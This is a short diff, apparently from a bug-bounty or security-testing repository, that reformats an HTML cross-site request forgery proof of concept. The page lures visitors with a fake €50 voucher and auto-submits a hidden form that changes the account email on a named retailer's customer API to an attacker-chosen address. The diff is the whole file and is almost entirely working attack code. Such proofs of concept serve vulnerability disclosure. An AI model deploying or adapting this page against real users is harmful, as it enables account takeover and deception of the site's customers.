@@ -1,14 +1,16 @@
 <!DOCTYPE html>
 <html>
-  <body>
+
+<body>
     <h1>Free Gift Voucher!</h1>
     <p>Click the button below to claim your €50 Boozt voucher.</p>
     <form id="csrf-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST">
-      <input type="hidden" name="email" value="absolutexon+solo@example.com" />
+        <input type="hidden" name="email" value="absolutexon+solo@example.com" />
     </form>
 
     <script>
-      document.getElementById('csrf-form').submit();
+        document.getElementById('csrf-form').submit();
     </script>
-  </body>
+</body>
+
 </html>
